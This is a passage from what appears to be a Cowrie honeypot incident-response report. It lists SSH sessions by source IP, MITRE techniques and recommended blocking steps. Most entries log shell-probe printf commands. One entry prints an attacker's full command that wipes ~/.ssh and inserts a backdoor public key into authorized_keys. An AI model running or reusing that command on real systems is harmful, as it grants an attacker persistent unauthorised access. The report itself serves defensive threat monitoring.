| `2026-11-02 04:23:23` | `cowrie.client.kex` |
| `2026-11-02 04:23:24` | `cowrie.login.success` |
| `2026-11-02 04:23:26` | `cowrie.client.size` |
| `2026-11-02 04:23:26` | `cowrie.session.params` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| `2026-11-02 04:23:27` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e241153dbd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:25 |
| **Last Seen** | 2026-11-02 04:25 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1bee554d82bac6883f7f0297c2a54dcd_small_control'"'"' '"'"'check_1bee554d82bac6883f7f0297c2a54dcd'"'"'', printf '\n%s|%s\n' 'check_1bee554d82bac6883f7f0297c2a54dcd_small_control' 'check_1bee554d82bac6883f7f0297c2a54dcd', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1bee554d82bac6883f7f0297c2a54dcd_small_math'"'"' "$((172*36+70))"', (172*36+70, printf '\n%s|%s\n' 'check_1bee554d82bac6883f7f0297c2a54dcd_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:25:24` | `cowrie.session.connect` |
| `2026-11-02 04:25:24` | `cowrie.client.version` |
| `2026-11-02 04:25:25` | `cowrie.client.kex` |
| `2026-11-02 04:25:26` | `cowrie.login.success` |
| `2026-11-02 04:25:26` | `cowrie.client.size` |
| `2026-11-02 04:25:27` | `cowrie.session.params` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| `2026-11-02 04:25:27` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed061bdade9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:27 |
| **Last Seen** | 2026-11-02 04:27 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d1b728971713e4abbbf56fce4dbdd29e_small_control'"'"' '"'"'check_d1b728971713e4abbbf56fce4dbdd29e'"'"'', printf '\n%s|%s\n' 'check_d1b728971713e4abbbf56fce4dbdd29e_small_control' 'check_d1b728971713e4abbbf56fce4dbdd29e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d1b728971713e4abbbf56fce4dbdd29e_small_math'"'"' "$((847*482+47))"', (847*482+47, printf '\n%s|%s\n' 'check_d1b728971713e4abbbf56fce4dbdd29e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:27:14` | `cowrie.session.connect` |
| `2026-11-02 04:27:14` | `cowrie.client.version` |
| `2026-11-02 04:27:14` | `cowrie.client.kex` |
| `2026-11-02 04:27:16` | `cowrie.login.success` |
| `2026-11-02 04:27:18` | `cowrie.client.size` |
| `2026-11-02 04:27:19` | `cowrie.session.params` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| `2026-11-02 04:27:19` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4ec3e338bd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:29 |
| **Last Seen** | 2026-11-02 04:29 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f7ec5a7daccfe9d173c86baa40ce7ee9_small_control'"'"' '"'"'check_f7ec5a7daccfe9d173c86baa40ce7ee9'"'"'', printf '\n%s|%s\n' 'check_f7ec5a7daccfe9d173c86baa40ce7ee9_small_control' 'check_f7ec5a7daccfe9d173c86baa40ce7ee9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f7ec5a7daccfe9d173c86baa40ce7ee9_small_math'"'"' "$((658*373+31))"', (658*373+31, printf '\n%s|%s\n' 'check_f7ec5a7daccfe9d173c86baa40ce7ee9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:29:06` | `cowrie.session.connect` |
| `2026-11-02 04:29:06` | `cowrie.client.version` |
| `2026-11-02 04:29:06` | `cowrie.client.kex` |
| `2026-11-02 04:29:07` | `cowrie.login.success` |
| `2026-11-02 04:29:08` | `cowrie.client.size` |
| `2026-11-02 04:29:08` | `cowrie.session.params` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| `2026-11-02 04:29:08` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f2cb560e636

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:31 |
| **Last Seen** | 2026-11-02 04:31 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8ecd6916d41d1328ce76aae5f2682bfb_small_control'"'"' '"'"'check_8ecd6916d41d1328ce76aae5f2682bfb'"'"'', printf '\n%s|%s\n' 'check_8ecd6916d41d1328ce76aae5f2682bfb_small_control' 'check_8ecd6916d41d1328ce76aae5f2682bfb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8ecd6916d41d1328ce76aae5f2682bfb_small_math'"'"' "$((666*146+86))"', (666*146+86, printf '\n%s|%s\n' 'check_8ecd6916d41d1328ce76aae5f2682bfb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:31:10` | `cowrie.session.connect` |
| `2026-11-02 04:31:10` | `cowrie.client.version` |
| `2026-11-02 04:31:10` | `cowrie.client.kex` |
| `2026-11-02 04:31:11` | `cowrie.login.success` |
| `2026-11-02 04:31:13` | `cowrie.client.size` |
| `2026-11-02 04:31:13` | `cowrie.session.params` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| `2026-11-02 04:31:13` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac72eb2f992

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:33 |
| **Last Seen** | 2026-11-02 04:33 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4152bdaf5d1d545ce827c52a952a665e_small_control'"'"' '"'"'check_4152bdaf5d1d545ce827c52a952a665e'"'"'', printf '\n%s|%s\n' 'check_4152bdaf5d1d545ce827c52a952a665e_small_control' 'check_4152bdaf5d1d545ce827c52a952a665e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4152bdaf5d1d545ce827c52a952a665e_small_math'"'"' "$((771*1+39))"', (771*1+39, printf '\n%s|%s\n' 'check_4152bdaf5d1d545ce827c52a952a665e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:33:12` | `cowrie.session.connect` |
| `2026-11-02 04:33:12` | `cowrie.client.version` |
| `2026-11-02 04:33:12` | `cowrie.client.kex` |
| `2026-11-02 04:33:13` | `cowrie.login.success` |
| `2026-11-02 04:33:14` | `cowrie.client.size` |
| `2026-11-02 04:33:14` | `cowrie.session.params` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:15` | `cowrie.command.input` |
| `2026-11-02 04:33:16` | `cowrie.command.input` |
| `2026-11-02 04:33:16` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614183dd0b3b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:35 |
| **Last Seen** | 2026-11-02 04:35 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f25486d4e4624c73812b7fad47d2c07b_small_control'"'"' '"'"'check_f25486d4e4624c73812b7fad47d2c07b'"'"'', printf '\n%s|%s\n' 'check_f25486d4e4624c73812b7fad47d2c07b_small_control' 'check_f25486d4e4624c73812b7fad47d2c07b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f25486d4e4624c73812b7fad47d2c07b_small_math'"'"' "$((223*823+54))"', (223*823+54, printf '\n%s|%s\n' 'check_f25486d4e4624c73812b7fad47d2c07b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:35:02` | `cowrie.session.connect` |
| `2026-11-02 04:35:02` | `cowrie.client.version` |
| `2026-11-02 04:35:03` | `cowrie.client.kex` |
| `2026-11-02 04:35:04` | `cowrie.login.success` |
| `2026-11-02 04:35:05` | `cowrie.client.size` |
| `2026-11-02 04:35:05` | `cowrie.session.params` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| `2026-11-02 04:35:05` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eab99dd2f469

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]155` |
| **First Seen** | 2026-11-02 04:35 |
| **Last Seen** | 2026-11-02 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:35:18` | `cowrie.session.connect` |
| `2026-11-02 04:35:18` | `cowrie.client.version` |
| `2026-11-02 04:35:18` | `cowrie.client.kex` |
| `2026-11-02 04:35:18` | `cowrie.login.success` |
| `2026-11-02 04:35:19` | `cowrie.session.params` |
| `2026-11-02 04:35:19` | `cowrie.command.input` |
| `2026-11-02 04:35:19` | `cowrie.log.closed` |
| `2026-11-02 04:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]155` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79757b4d0e15

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:36 |
| **Last Seen** | 2026-11-02 04:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b9c3caf9c51817e03fc4ef1c0cc53bfc_small_control'"'"' '"'"'check_b9c3caf9c51817e03fc4ef1c0cc53bfc'"'"'', printf '\n%s|%s\n' 'check_b9c3caf9c51817e03fc4ef1c0cc53bfc_small_control' 'check_b9c3caf9c51817e03fc4ef1c0cc53bfc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b9c3caf9c51817e03fc4ef1c0cc53bfc_small_math'"'"' "$((697*430+26))"', (697*430+26, printf '\n%s|%s\n' 'check_b9c3caf9c51817e03fc4ef1c0cc53bfc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:36:53` | `cowrie.session.connect` |
| `2026-11-02 04:36:54` | `cowrie.client.version` |
| `2026-11-02 04:36:54` | `cowrie.client.kex` |
| `2026-11-02 04:36:55` | `cowrie.login.success` |
| `2026-11-02 04:36:57` | `cowrie.client.size` |
| `2026-11-02 04:36:57` | `cowrie.session.params` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| `2026-11-02 04:36:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa720bafea36

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:38 |
| **Last Seen** | 2026-11-02 04:39 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_870c920e912da346c2686465dd12315f_small_control'"'"' '"'"'check_870c920e912da346c2686465dd12315f'"'"'', printf '\n%s|%s\n' 'check_870c920e912da346c2686465dd12315f_small_control' 'check_870c920e912da346c2686465dd12315f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_870c920e912da346c2686465dd12315f_small_math'"'"' "$((675*724+41))"', (675*724+41, printf '\n%s|%s\n' 'check_870c920e912da346c2686465dd12315f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:38:43` | `cowrie.session.connect` |
| `2026-11-02 04:38:43` | `cowrie.client.version` |
| `2026-11-02 04:38:43` | `cowrie.client.kex` |
| `2026-11-02 04:38:44` | `cowrie.login.success` |
| `2026-11-02 04:38:46` | `cowrie.client.size` |
| `2026-11-02 04:38:46` | `cowrie.session.params` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| `2026-11-02 04:38:47` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa27062a4fd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:40 |
| **Last Seen** | 2026-11-02 04:41 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4d99448b614c1c3600cf0015f074fe59_small_control'"'"' '"'"'check_4d99448b614c1c3600cf0015f074fe59'"'"'', printf '\n%s|%s\n' 'check_4d99448b614c1c3600cf0015f074fe59_small_control' 'check_4d99448b614c1c3600cf0015f074fe59', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4d99448b614c1c3600cf0015f074fe59_small_math'"'"' "$((923*701+78))"', (923*701+78, printf '\n%s|%s\n' 'check_4d99448b614c1c3600cf0015f074fe59_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:40:41` | `cowrie.session.connect` |
| `2026-11-02 04:40:41` | `cowrie.client.version` |
| `2026-11-02 04:40:41` | `cowrie.client.kex` |
| `2026-11-02 04:40:42` | `cowrie.login.success` |
| `2026-11-02 04:40:43` | `cowrie.client.size` |
| `2026-11-02 04:40:43` | `cowrie.session.params` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| `2026-11-02 04:40:44` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7755dda244c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:42 |
| **Last Seen** | 2026-11-02 04:43 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5047302dbed430639a77679d822f3dd2_small_control'"'"' '"'"'check_5047302dbed430639a77679d822f3dd2'"'"'', printf '\n%s|%s\n' 'check_5047302dbed430639a77679d822f3dd2_small_control' 'check_5047302dbed430639a77679d822f3dd2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5047302dbed430639a77679d822f3dd2_small_math'"'"' "$((612*442+85))"', (612*442+85, printf '\n%s|%s\n' 'check_5047302dbed430639a77679d822f3dd2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:42:31` | `cowrie.session.connect` |
| `2026-11-02 04:42:32` | `cowrie.client.version` |
| `2026-11-02 04:42:32` | `cowrie.client.kex` |
| `2026-11-02 04:42:35` | `cowrie.login.success` |
| `2026-11-02 04:42:36` | `cowrie.client.size` |
| `2026-11-02 04:42:36` | `cowrie.session.params` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| `2026-11-02 04:42:37` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3db1307da7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.63[.]157` |
| **First Seen** | 2026-11-02 04:43 |
| **Last Seen** | 2026-11-02 04:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:43:25` | `cowrie.session.connect` |
| `2026-11-02 04:43:25` | `cowrie.client.version` |
| `2026-11-02 04:43:26` | `cowrie.client.kex` |
| `2026-11-02 04:43:26` | `cowrie.login.success` |
| `2026-11-02 04:43:27` | `cowrie.session.params` |
| `2026-11-02 04:43:27` | `cowrie.command.input` |
| `2026-11-02 04:43:27` | `cowrie.command.failed` |
| `2026-11-02 04:43:28` | `cowrie.log.closed` |
| `2026-11-02 04:43:29` | `cowrie.session.params` |
| `2026-11-02 04:43:29` | `cowrie.command.input` |
| `2026-11-02 04:43:29` | `cowrie.session.file_download` |
| `2026-11-02 04:43:29` | `cowrie.log.closed` |
| `2026-11-02 04:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.63[.]157` to AbuseIPDB if not already reported
- [ ] Block `165.154.63[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ba94b98e23

| Field | Detail |
|---|---|
| **Source IP** | `165.154.63[.]157` |
| **First Seen** | 2026-11-02 04:43 |
| **Last Seen** | 2026-11-02 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:43:30` | `cowrie.session.connect` |
| `2026-11-02 04:43:30` | `cowrie.client.version` |
| `2026-11-02 04:43:30` | `cowrie.client.kex` |
| `2026-11-02 04:43:31` | `cowrie.login.success` |
| `2026-11-02 04:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.63[.]157` to AbuseIPDB if not already reported
- [ ] Block `165.154.63[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (282) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-73d4c93cbbdc | HIGH | `92.118.39[.]77` | 2026-11-02 04:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-476613e257dc | HIGH | `4.150.201[.]26` | 2026-11-02 04:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6bf5bae3e9ea | HIGH | `193.32.162[.]15` | 2026-11-02 04:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7c75f7ad9077 | HIGH | `4.150.201[.]26` | 2026-11-02 04:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-12ebf68fc614 | HIGH | `92.118.39[.]77` | 2026-11-02 04:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c4a886c2be83 | HIGH | `202.46.28[.]140` | 2026-11-02 04:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5088d173f561 | HIGH | `202.46.28[.]140` | 2026-11-02 04:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2f517da9eff9 | HIGH | `158.180.79[.]132` | 2026-11-02 04:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bdafd5e28499 | HIGH | `158.180.79[.]132` | 2026-11-02 04:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-77b028b034b7 | HIGH | `92.118.39[.]77` | 2026-11-02 04:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0f155423540b | HIGH | `102.140.97[.]134` | 2026-11-02 04:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-701b182b34e0 | HIGH | `102.140.97[.]134` | 2026-11-02 04:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8d5cbf9adc25 | HIGH | `112.135.173[.]138` | 2026-11-02 04:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d2ec790568cf | HIGH | `112.135.173[.]138` | 2026-11-02 04:49 | Y | 0 | 0 | `T1078 · T1592` |
